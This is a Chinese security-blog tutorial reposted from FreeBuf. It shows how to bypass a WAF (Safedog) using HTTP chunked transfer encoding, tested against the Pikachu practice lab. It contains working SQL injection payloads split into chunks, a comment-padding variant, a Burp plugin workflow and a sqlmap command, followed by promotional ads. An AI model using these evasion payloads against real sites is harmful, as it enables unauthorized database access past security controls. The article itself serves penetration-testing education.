---
title: 渗透测试-WAF分块传输绕过
url: https://mp.weixin.qq.com/s/0yHnejMybFKb1CRQObb0Mw
source: Doonsec's feed
date: 2026-11-02
fetch_date: 2026-11-03T08:47:37.128655
---

# 渗透测试-WAF分块传输绕过

# 渗透测试-WAF分块传输绕过

爱屋及乌iw
爱屋及乌iw

陌笙不太懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

```
原文作者:爱屋及乌iw原创链接:https://www.freebuf.com/articles/web/477917.html
```

## 0x01 分块传输介绍

分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。在消息头中指定Transfer-Encoding: chunked 就表示整个response将使用分块传输编码来传输内容，一个完整的消息体由n个块组成，并以最后一个大小为0的块为结束。每个非空的块包括两部分，分别为：块的长度（用十六进制表示）后面跟一个CRLF （回车及换行），长度并不包括结尾的回车换行符。第二部分就是数据本身，同样以CRLF （回车及换行）结束。最后一块是单行，只由块大小（0）以及CRLF组成，不包含任何数据。

通常情况下，HTTP的响应消息体（message body）是作为整包发送到客户端的，用头（Content-Length） 来表示消息体的长度，这个长度对客户端非常重要，因为对于持久连接TCP并不会在请求完立马结束，而是可以发送多次请求/响应，客户端需要知道哪个位置才是响应消息的结束，以及后续响应的开始，因此Content-Length显得尤为重要，服务端必须精确地告诉客户端（message body）的长度是多少，如果（Content-Length）比实际返回的长度短，那么就会造成内容截断，如果比实体内容长，客户端就一直处于pendding状态，直到所有的（message body）都返回了请求才结束。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ5s2nfo0weeIxicry24IcBKCq4GskibKEMZHjx9rL3GRdEpJozBy6jyFLf7NeQKw5O4j2ZCNAnucJde7VXaFRYzibv4O3BuGSe8c/640?wx_fmt=png&from=appmsg)

## 0x02 分块传输环境

* 测试WAF：网站安全狗Apache版 v4.0.18089.0官方版，点击下载
* 测试靶场 Pikachu，点击下载
* 测试环境 phpstudy 2018，点击下载

> 安装安全狗时可能遇到无法找到服务名问题，可以查看这篇文章解决：https://www.cnblogs.com/bubuchu/p/8980478.html

默认安装完安全狗WAF是没有开启POST内容防护的，所以需要手动在网站防护设置中添加POST内容检测项目

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQMksfTa7MSeHlDsCUkIxRNQC2L6U1uUpCdbeGoGiaiamxvpriby2G1wUo5fMibs1ykhAH9OmlbWicJbpFsu6GeVDRgicYryaarKX85Q/640?wx_fmt=png&from=appmsg)

## 0x03 分块传输利用

以pikachu靶场的数字型注入为例，使用BurpSuite拦截原始数据包如下

```
POST /pikachu/vul/sqli/sqli_id.php HTTP/1.1Host: 192.168.158.130User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 30Origin: http://192.168.158.130Connection: closeReferer: http://192.168.158.130/pikachu/vul/sqli/sqli_id.phpCookie: PHPSESSID=47e99803d7065c8ba4e8384b4ef3c808; safedog-flow-item=Upgrade-Insecure-Requests: 1
id=1&submit=%E6%9F%A5%E8%AF%A2
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQn4kubhbHFukgI0ia7fGc4usSRmCbGYtxQDtibxJdd8F75J90TSm5kBEjlRDkFqIs0TvJD72lzEDNzxk6VYtgIhIibCUR5ibwBkbU/640?wx_fmt=png&from=appmsg)

直接使用`id=1 and 1=1 --`，⼀般的WAF都会检测拦截

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTVyEpUNgGTPAIkINicCQRNgV4pGU8dX8VakR02LibkMq2Lbvmfr0OBDibIk98aQQNEicvl74qRyjlBJVTjrp8L8FhlAAp9y9ecMZQ/640?wx_fmt=png&from=appmsg)

在请求头添加【Transfer-Encoding】并且值设为【Chunked】，设置成功后就可以进⾏多个分块数据的传输

```
Transfer-Encoding: Chunked
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR97BeEicXftCF7JsFJEszQswibt9w0DUUEZwstXjYkjSDJPH2a5QpYQgmcPo8dSVER3zXcoPq6uN8JfDY3SDR4Bf9A7yBpOzqyg/640?wx_fmt=png&from=appmsg)

通过分块传输进⾏绕过，将原始数据进行拆分小块，注意每个小块长度尽量不要设置太大，否则可能引起报错。

```
原始请求数据：id=1 and 1=1 -- &submit=%E6%9F%A5%E8%AF%A2分块传输数据：4id=15 and 31=14 -- 8&submit=9%E6%9F%A59%E8%AF%A20（两个换行）
```

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTGamo0gfV9hNwKXncNVNWYSn4BNBjbERELqyicjYeOKMKBBIqZdWKNPtaoK1GRzDJibAibnOW2r4gfy5ptiaUeYCXcGOciaKn61Zp0/640?wx_fmt=png&from=appmsg)

```
在本地靶场测试过程中发现，分块长度超过10时会导致报错，具体分块长度视实际情况而定。
```

一些比较好的WAF已经对Transfer-Encoding的分块传输做了处理，可以把分块组合成完整的HTTP数据包，这时直接使用常规的分块传输方法尝试绕过的话，会被WAF直接识别并阻断。

分块传输可以在长度标识处加上分号“;”作为注释，如：

```
4;testid=15;aaaaaaaaaa and 3;1234561=14;asdsdsasdqweq -- 8;QWEasdZXC&submit=9;1qaz2wsx%E6%9F%A59;123123123%E8%AF%A20(两个换行)
```

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQpOWg0dWibkwtdRAvnTtY1Wzal41A7aYIjY9aLMH6Jwgq7AaEFP2d7G674gajyiaeSQYicMIiaFDibiaupJIfFiaqAczZKmWHbC1ia9EY/640?wx_fmt=png&from=appmsg)

利用分块传输绕过WAF进行SQL注入读取数据当前数据库用户名

```
原始payload：id=-1 union select 1,user() -- &submit=%E6%9F%A5%E8%AF%A2分块传输payload：5id=-17 union 6select9 1,user()4 -- 8;QWEasdZXC&submit=9;1qaz2wsx%E6%9F%A59;123123123%E8%AF%A20（两个换行）
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTkFnZEBdNodGhOpz2ZfDv4wYLks8hSbQFvpPz49V2hDNT6HYXFHssAurj0Faork403LhCbe9n33mh6ImIov79Ik7q6aZe6wn4/640?wx_fmt=png&from=appmsg)

## 0x04 BurpSuite分块传输插件

Chunked coding converter 是一款用于分块传输绕WAF的BurpSuite扩展插件

* 项目地址：https://github.com/c0ny1/chunked-coding-converter

将分块传输插件下载到本地，并导入添加到BurpSuite扩展中使用

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSQOkoibtYO5GftdicBibiaJZ0lYLMtNdBvpWfq2aBuhH5Auicev2bXWgzQhbZnMf6N0DKugeTyiafKNyXC5bBFvDqQ0qSnicGpTtrF48/640?wx_fmt=png&from=appmsg)

导入成功后，可在重放数据包界面中右键查看到插件扩展

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQLibHtkpAtKX5lgM5U7MZ6ib7Jbt2icCkTmnC8zUIibXs0sT83umj9pBF1robqicicKKq5BHTzia9Ael7iaoDbZRkbl60au5dt1TicS9pI/640?wx_fmt=png&from=appmsg)

点击配置，可以对分块传输内容进行调整

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRtb9LamTlgVrv7AJiaFgyiav9HQjG9Ifq1jSicUnsmVhLX3ZgSibG5fv7tPlBsdusPTOdSepsUxh9Bbk0LaNjIYF6dBEr3M5ubmf0/640?wx_fmt=png&from=appmsg)

首先在数据包中将要SQL注入测试的语句编辑好，然后利用插件的（Encoding request body）功能进行分块传输编码

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRCR5OUI9Zcrdf2vdCuOjAIJyxaFxe8dvXD9ZJcaibBNUWWRV5t0DnUr6aVQaMmV61KQn62iazNKjbuGfDJkAsiahh86yjh1UrcBQ/640?wx_fmt=png&from=appmsg)

编码成功后，可以看到数据包中的内容被自动替换，重放数据包即可绕过WAF注入成功

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQbLKDWU9V8JgCGaHUVeaxTXFAZVTs8pQaIBaXPHGVIvqEqiazOP96lyAOibRzEwcE9aATKpSw7fftmVe3gVZaiaiaRapv8Bic7jph0/640?wx_fmt=png&from=appmsg)

## 0x05 sqlmap联动分块传输插件

为了方便演示，在测试sqlmap分块传输注入前，需要将安全狗的cc攻击防护关闭

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSXqCAevYl7fsa0WyIu8ALeInARicAn6J9toZYrr2yM6FibHTwXKmYda7phx0Ihkv6QHAicCVhNuGibCslrPnFEBicia78nyXHWQDdf4/640?wx_fmt=png&from=appmsg)

首先在分块传输插件的设置中，勾选作用于代理（Proxy）

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTUQOeMQREbYKB0aymEBzrFzPniaM3b0E1Lxicaqia4zQ5I4MibOKP5VvibpicOjaxdSFcnvqxAnfxtWrzJ35QOs7cUtRvSoFmxr7icwk/640?wx_fmt=png&from=appmsg)

将BurpSuite拦截的数据包保存到本地txt文件中，sqlmap使用-r参数读取本地txt文件，-p指定注入参数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQn5SYJGicu0ykB1ozFFdZQYl1P4ZFdwU4B16mR32ERCib8YwhZgd2NgDRxwluUfIchyBPHu1IUQv7NDqtk4icAv6nGbJuhribjBUk/640?wx_fmt=png&from=appmsg)

然后使用sqlmap对漏洞参数进行注入测试，并设置BurpSuite的代理地址

```
sqlmap -r sql.txt -p id --dbs --fresh-queries --proxy=http://127.0.0.1:8080
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTibnrI4pZyHRltMgM64ia8q6svnuxDqZIjK6IVLEWnWLPKW3icA5xicHibx4UITIDS6ianUnsHpTKlePxtkm5jPMdBfdgo7XAQ2pm9s/640?wx_fmt=png&from=appmsg)

**后台回复加群加入交流群**

**广告：****cisp pte/pts &nisp1级2级低价报考**

**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库****简单介绍****（****加入纷传圈子****送****知识库+漏洞库+面试题库****）**

如果觉得合适可以加入,圈子目前价格39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。

**圈子福利**

**edu漏洞挖掘1v1指导出洞**

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKQWHxLsRrPqpqdiceX76d7yExQIyOqFmmJAfHQh7qzKvPc2V5z6iaa0RY6Ib8AsGvgS5MKkAk5aaHnJBaSnI10LDKQYMLcQMmg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8pnPeapLBK4Jsa4ufCvFoGL66t7PKeZyA3AjNxsObjtnCibN2gzGX7NMS7Wo5sj3YYL2iboeRuQDcWqiapc8xuo5fticoBG4DsyY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKIBNIQIVicRWJLbyGRmg92vPzc8375PJpcYVvfywzwqnaeBicZuEbfvuic9KRdjwkahSDic5VqrH2Mb4NkqtkADl5HLIh8gPex60/640?wx_fmt=png&from=appmsg)

**skill+grok辅助挖掘某企业sr****c****实战效果，能出但是重复多，agent独立挖掘也可以，见仁见智，看个人习惯，好的模型是最重要的。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQwyn779TTwY7vZkePQCL8k3K8dYxNdyzfgADL4dJcNUvpmodLeDVCZ6xDC4RJXEBmO2tcWqgUNdTVicKTW0jpdsg7X6xwP5gIQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQnIqagDL2A4BUIXrib9YVmATWuaIDqETqYd9ToHib52mDyoMyqc6Wzh733FRnbsDsGgey7B8s8jr72UtkPY6ich58niaPJqoItKcE/640?wx_fmt=png&from=appmsg)

**企业src边缘&核心资产实战效果&&有重复但是证明好模型+AI确实够用**

**（图片仅供参考，我出不等于你出，见识**到**ai神力即可，多去用AI!!!）**

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT1YNI9U6r6NMO4UMUBROoWeC4XQC4Dge94ODZ7tXY6tbxqb3IJoghve0u1SfkygE5UJ5HTdUBvLZKrn5ps13F71piax5dlHnOE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTGjdxKy4nllaLXIznTvRqicichITccuB8psYFRYakw6ViauCk6iccziahfPw4fnrqhyCp7Zkq7lRI0DOicyrZlNyicYibTVibfGFZVaG0c/640?wx_fmt=...